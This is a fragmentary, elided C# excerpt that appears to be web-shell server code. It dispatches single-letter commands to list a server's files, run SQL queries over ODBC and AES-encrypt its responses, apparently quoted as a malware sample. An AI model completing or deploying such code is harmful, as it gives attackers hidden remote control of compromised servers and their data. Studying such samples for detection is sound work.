                ...
                switch (Z)
                {
                    ...
                    case "B":
                    {
                        ...
                        foreach (FileInfo D in m.GetFiles())
                        {
                            R += String.Format("{0}\t{1}\t{2}\t-\n", D.Name,
                                File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"), D.Length);
                        }
                    ...
                    case "N":
                    {
                        ...
                        using (System.Data.Odbc.OdbcDataAdapter dataAdapter =
                            new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
                        {
                            dataAdapter.Fill(ds);
    ...
    public String encode(String src)
    {
        ...
        try
        {
            switch (encoder)
            {
                ...
                {
                    ret = EncryptAes(key,
                        System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src)));
                    break;
                }
                default:
                {
